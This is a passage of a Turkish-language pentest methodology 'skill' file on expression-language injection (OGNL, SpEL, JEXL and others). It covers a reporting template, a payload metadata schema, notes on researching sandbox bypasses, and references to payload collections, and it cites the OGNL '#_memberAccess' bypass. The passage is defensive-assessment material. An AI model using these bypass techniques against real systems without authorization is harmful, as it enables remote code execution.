| Apache Wicket | OGNL-benzeri property access (`PropertyModel`, `CompoundPropertyModel`) | Application-specific — gerçek OGNL değildir ama benzer sözdizimi/risk taşır |
| MuleSoft Anypoint | MVEL (eski sürümler) / DataWeave (yeni sürümler, bu skill'in kapsamı dışında ayrı bir dildir) | Version-dependent: `expression-component`, `choice` router'larında MVEL — bkz. §12.4 |
| Bonita BPM | Groovy (script task'lerde, SSTI skill'ine bakınız) — Camunda/Flowable ile aynı iş akışı kategorisi | Application-specific: `scriptFormat` seçimine bağlı |
| Alfresco CMS | Java EL + FreeMarker (FreeMarker kısmı SSTI skill kapsamında) | Application-specific: WebScript'lerde Java EL kullanımı — bkz. §12.1 |
| Magnolia CMS | Java EL | Default behavior: template'lerde `${}` kullanımı — bkz. §12.1 |
| Hippo CMS (Bloomreach) | Java EL | Default behavior: HST template context'i — bkz. §12.1 |
| Oracle ADF | Java EL (JSF tabanlı) | Default behavior: enterprise Java uygulamalarında yaygın — bkz. §12.1 |
| SAP NetWeaver Portal | Java EL | Default behavior: kurumsal Java portal altyapısı — bkz. §12.1 |
| JasperReports / TIBCO | JEXL / MVEL (raporlama ifadelerinde) | Application-specific: hangi ifade dilinin seçildiğine bağlı — bkz. §12.4, §12.5 |
| Grails | Groovy (SSTI skill kapsamında) + SpEL (Spring entegrasyonu üzerinden) | Application-specific: Grails 3+ Spring Boot temellidir, `@Value`/Spring Security SpEL kullanılabilir — bkz. §12.3 |
| Salesforce Apex | **Kapsam DIŞI** — kendi diline (Apex) sahiptir, Java EL ailesine dahil değildir | N/A |
| ServiceNow | **Kapsam DIŞI** — script alanları JavaScript tabanlıdır (bkz. SSTI skill), Java EL ailesine dahil değildir | N/A |

---

## 14. Raporlama ve Payload Metadata Şeması

### 14.1 Raporlama Şablonu

Her EL Injection bulgusu için rapor şu unsurları içermelidir:

1. **`vulnerability_class`** — bulgunun gerçek sınıfı, açıkça
   etiketlenir: `EL_INJECTION` / `SSTI` (yanlışlıkla EL Injection
   sanılmaması için, bkz. §3.2) / `POLICY_AUTHORIZATION_BYPASS`
   (CEL/FEEL bağlamında RCE değil mantık atlatma — bkz. §12.6, §12.7)
   / `RULE_ENGINE_CODE_INJECTION` (Drools/DRL `then` bloğu gibi,
   kullanıcı girdisinin tek bir ifadeyi değil ardışık statement'lardan
   oluşan tam bir kod bloğunu derlediği/çalıştırdığı durumlar — bkz.
   §12.4 "Drools/DRL bağlamı"; bu, saf `EL_INJECTION`'dan daha geniş
   bir etki yüzeyine işaret ettiği için ayrı sınıflandırılır)
   / `OBJECT_PROPERTY_ACCESS` (§6 Type Confusion) / `XSS` (kapsam
   dışı, yalnızca yanlışlıkla EL Injection sanılmaması için not
   düşülür) / `UNKNOWN`. Bu alan, dosya genelinde zaten yapılan
   EL-Injection/SSTI/XSS/Type-Confusion ayrımını (§3.1, §3.2, §6)
   rapor seviyesinde **zorunlu** hale getirir.
2. **Hedef:** URL/route, HTTP method, etkilenen parametre/alan.
3. **Tespit edilen motor, versiyon (varsa) ve confidence seviyesi**
   — **EL Injection classification** ve **engine classification**
   §8.4'teki tanıma göre **ayrı ayrı** raporlanır:
   - EL Injection (causality) "confirmed" mi: Eksen 1'den **tek bir
     kanıt türü** (evaluation / stored-indirect / OOB), §5.1'deki
     geçerli bir negatif kontrolle birlikte, **yeterlidir**.
   - Engine (attribution) "confirmed" mi: en az bir Strong indicator
     + tutarlı davranış — SSTI classification'ından bağımsız bir alan.
   - confidence_score (§10.5) yalnızca destekleyici bilgidir.
4. **Detection payload'ı** — tam request/response (marker dahil,
   `6666*6666`→`44435556` gibi).
5. **Confirmation kanıtı** — EL Injection "confirmed" için gereken tek
   Eksen-1 kanıtının kendisi ve onun §5.1'e göre kurulmuş negatif
   kontrolü.
6. **Beklenen vs gerçekleşen sonuç** — net karşılaştırma.
7. **False-positive olmadığının kanıtı** — negatif kontrol, ve
   gerekiyorsa SSTI/XSS/object-property-access ayrımının gösterimi.
8. **Impact assessment gerekçesi** — sandbox/kısıtlama var mı/aşıldı
   mı (özellikle `StandardEvaluationContext` vs
   `SimpleEvaluationContext`, ya da CEL'in tasarım gereği RCE
   sağlamadığı durumlar), yalnızca bilgi sızıntısı mı yoksa RCE'ye mi
   gidildi, yoksa yalnızca **policy/authorization bypass** mı (CEL/
   FEEL/Spring Security bağlamı), etkilenen verinin hassasiyeti.
9. **Reproduction adımları** — başka birinin aynı sonucu tekrar
   üretebilmesi için yeterli detay.

**Rapora eklenmemesi gerekenler:** Zafiyeti kanıtlama amacı taşımayan,
RCE ile elde edilebilecek zararlı komutların ayrıntılı bir listesi;
zafiyetle doğrudan ilgisi olmayan hedef sistem iç bilgileri.

### 14.2 Payload Metadata Şeması

Yeni bir payload eklerken, şu alanları takip et (SSTI skill'indeki
şemayla birebir aynı):

| Alan | Açıklama |
|---|---|
| engine | Hangi motor (OGNL/SpEL/Java-EL/MVEL/JEXL/CEL/FEEL/DRL/Aviator/QLExpress veya "generic") |
| version_range | Bilinen minimum/maksimum versiyon (varsa) |
| syntax | Tam payload metni |
| context | plain/attribute/JSON-field/config-value/expression |
| purpose | detection / fingerprinting / confirmation |
| expected_result | Beklenen çıktı (ham/raw temsil) |
| alternatives | Eşdeğer alternatif syntax'lar |
| encoding_variants | Bilinen encode edilmiş varyantlar |
| behavior_dependency | default / configuration-dependent / version-dependent / application-specific |
| evidence_category | reflection / evaluation / fingerprint / context / stored-indirect / OOB |
| fp_risk | Yanlış pozitif riski: düşük / orta / yüksek |
| kaynak | Bu payload'ın kökeni |
| payload_stage *(yeni eklenen payload'lar için zorunlu)* | §1.5 Payload Stage Model'e göre: P0-reflection / P1-syntax / P2-evaluation / P3-context / P4-object-discovery / P5-capability / P6-impact |
| prerequisites *(yeni eklenen payload'lar için zorunlu)* | Bu payload'ın çalışması için gerekli önkoşullar (örn. `evaluation_context=StandardEvaluationContext`, `sandbox=absent`, `member_access=unrestricted`) — §1.7 Prerequisite Gate bu alanı okur |
| side_effect_level *(yeni eklenen payload'lar için zorunlu)* | none / information-disclosure / external-interaction (OOB) / state-changing — bkz. aşağıdaki tablo |

  ```text
  none                    Hiçbir side-effect yok (aritmetik sonuç, boolean, string concat)
  information-disclosure  Hassas bilgi okuma (env var, system property, dosya içeriği,
                           config değeri) — sistem durumunu DEĞİŞTİRMEZ ama hassas
                           veri sızdırır ("read-only" etiketi tek başına bunu ayırt
                           etmediği için bu isim tercih edilmiştir)
  external-interaction    Network callback (DNS/HTTP/OOB) — hedef sistemi değiştirmez
                           ama dışarıya bir sinyal gönderir
  state-changing          Sistem durumunu değiştirme (dosya yazma, process spawn,
                           session/config manipülasyonu) — §0.2 sınırlarına en çok
                           dikkat gerektiren seviye
  ```

**Geriye dönük etiketleme yapılmıyor** — SSTI skill'indeki aynı
gerekçe (bkz. SSTI skill §14.2): orantısız efor karşılığında düşük
değer katar. Bu üç alan yalnızca **bundan sonra eklenecek** içerik
için zorunludur.

### 14.3 Bilinen Sandbox-Bypass Desenlerini Araştırma Notu

Struts2/OGNL (`#_memberAccess` bypass zinciri), Spring/SpEL
(`EvaluationContext` seçimi), JEXL (`JexlSandbox`), Aviator/QLExpress
(class whitelist) için yıllar içinde yayınlanmış public bypass
teknikleri, confirmation payload'larının zengin bir kaynağıdır. Bir
hedefte standart confirmation payload'ı bir kısıtlama tarafından
engellenirse veya belirli bir versiyon tespit edilirse, ilgili motor
için güncel kaynaklardan (web araması ile) şunları araştır: etkilenen
versiyon aralığı, root cause, detection pattern'i, modern/düzeltilmiş
sürümdeki davranış. Eski bir bypass payload'ını güncel sürümde
otomatik çalışır varsaymak false-negative'e yol açabilir.

---

## 15. Referans Araçlar ve Kaynaklar

**Araçlar:** SSTI skill'indeki aynı gerekçeyle, bu skill de çoğu
"otomatik EL Injection tarayıcısı"nın skill içinde ayrıca
listelenmesini gereksiz bulur. **Tek istisna: interactsh-client**
(bkz. §9.3) — OOB testleri için gerekli, aktif olarak bakımı yapılan
ve motora özgü bir "tespit" iddiası taşımayan sade bir araç olduğu
için ayrıca anılmaya değer.

**Bilgi kaynakları (araç değil, referans dokümantasyon):**
- **PortSwigger Research** — Java EL/OGNL/SpEL Injection'a dair
  makaleler; SSTI ile EL Injection ayrımına dair orijinal
  kaynaklardan biri.
- **PayloadsAllTheThings** (`swisskyrepo/PayloadsAllTheThings`) —
  "Server Side Template Injection" bölümünün altındaki EL-özgü
  (Java EL/OGNL/SpEL) alt bölümler, motor bazlı ek payload
  koleksiyonu için değerli bir referanstır.
- **HackTricks** (`hacktricks.wiki` — "EL - Expression Language"
  sayfası) — Java EL/OGNL/SpEL için temel payload koleksiyonu ve
  gerçek dünya bypass örnekleri (`#_memberAccess=@ognl.OgnlContext@
  DEFAULT_MEMBER_ACCESS` kanonik bypass'ı dahil — bkz. §12.2); güncel
  zafiyetler ve modern sandbox/EvaluationContext notları için düzenli
  olarak tekrar kontrol edilmelidir.
- **marcin33/hacking — `spel-injections.txt`** (GitHub) — SpEL'e özgü,
  düzenli olarak referans alınan geniş bir hazır payload listesi
  (`T(...)` tabanlı, karakter-kod-noktası ile obfuscate edilmiş
  varyantlar dahil).
- **mediaservice.net teknik blog — "Exploiting OGNL Injection"** —
  OGNL/Struts2'nin `#_memberAccess`/`ValueStack` iç mekanizmasının
  derinlemesine anlatımı; bypass tekniklerinin **neden** çalıştığını
  anlamak için birincil kaynaktır.
- **pentest-tools.com blog — "Exploiting OGNL Injection in Apache
  Struts"** — OGNL/Struts2 saldırı yüzeyine pratik giriş.
- **exploit-db.com — "Remote Code Execution with EL Injection
  Vulnerabilities" (PDF)** — EL Injection'ın genel taksonomisine dair
  akademik/teknik bir referans.
- **WAF bypass araştırması (SpEL'e özgü)** —
  `h1pmnh.github.io/post/writeup_spring_el_waf_bypass/` — gerçek bir
  WAF önünde SpEL Injection bypass sürecinin adım adım anlatımı;
  §8.2'deki genel WAF/Filter akışının somut bir vaka çalışması olarak
  faydalıdır.
- **Apache/Google resmi dokümantasyonu** — JEXL (`JexlSandbox` API),
  CEL (dil spesifikasyonu ve güvenlik modeli, `cel-spec` deposu),
  Spring (`EvaluationContext` API dokümantasyonu) — motorun kendi
  güvenlik tasarımını anlamak için birincil kaynaklardır.
- **Not — bu dosyada bilinçli olarak yapılmayan bir şey (SSTI
  skill'iyle birebir aynı prensip):** Bu skill dosyası, hiçbir yerde
  spesifik bir CVE/GHSA kimliği veya kesin sürüm numarası hard-code
  etmez — çünkü bu tür kimlikler ve onlara bağlı "hangi sürümde
  düzeltildi" iddiaları zamanla değişebilir, yanlış atfedilebilir
  veya kaynağında dahi hatalı olabilir. Bunun yerine davranış (ör.
  "bazı sürümlerde bir korumayı kendi context'i içinden devre dışı
  bırakmak mümkündür, bazılarında değildir") anlatılır ve şüpheli/
  yüksek etkili bir iddiayla karşılaşıldığında güncel kaynaktan
  **testte ampirik olarak** doğrulanması önerilir.
